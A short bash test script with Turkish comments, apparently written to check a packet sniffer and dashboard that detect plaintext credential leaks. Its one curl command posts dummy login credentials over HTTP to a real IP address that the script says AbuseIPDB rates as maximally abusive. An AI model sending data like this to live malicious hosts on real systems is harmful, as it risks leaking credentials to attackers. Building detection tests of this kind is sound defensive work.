#!/bin/bash

# AbuseIPDB API dokümantasyonunda 100 skora sahip olduğu bilinen IP
BAD_IP="118.25.6.39"

echo "[TEST] Bilinen Kötü IP'ye ($BAD_IP) HTTP Leak (Port 80) testi gönderiliyor..."
echo "Sniffer terminalini ve Dashboard'u kontrol et!"

# --connect-timeout 3 -> 3 saniyeden fazla bekleme
# -d "username=..." -> 'username' anahtar kelimesini içeren payload
curl http://$BAD_IP/login -d "username=admin&password=123" --connect-timeout 3

echo "[TEST] Tamamlandı."
